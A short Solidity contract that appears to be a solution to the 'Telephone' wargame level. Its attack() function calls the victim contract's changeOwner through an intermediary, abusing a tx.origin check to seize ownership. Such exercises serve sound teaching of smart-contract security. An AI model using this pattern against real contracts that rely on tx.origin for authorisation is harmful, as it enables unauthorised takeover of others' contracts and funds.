// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./Telephone.sol";

// tx.origin is the original caller of contract (attacker wallet)

contract Solution2 {
    Telephone public victim;

    constructor(Telephone victim_) {
        victim = victim_;
    }

    function attack() external payable {
        victim.changeOwner(msg.sender);
    }
}
